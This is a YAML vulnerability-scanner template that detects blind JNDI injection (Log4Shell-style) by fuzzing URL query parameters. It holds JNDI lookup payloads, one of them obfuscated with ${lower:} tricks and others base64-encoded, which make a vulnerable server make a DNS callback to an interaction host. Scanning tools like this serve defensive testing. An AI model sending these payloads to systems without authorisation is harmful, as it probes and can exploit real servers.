http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  fuzzing:
  - fuzz:
    - '{{jndi}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    jndi:
    - ${jndi:dns://{{interactsh-url}}
    - ${lower:d}n${lower:s}://{{interactsh-url}}/abc
    - '{{base64(''${jndi:dns://{{interactsh-url}}'')}}'
    - '{{base64(''dns://{{interactsh-url}}'')}}'
  stop-at-first-match: true
id: blind-jndi-via-dns
info:
  author: reewardius
  name: Blind JNDI via DNS Detection
  severity: high
  tags: blind,fuzzing
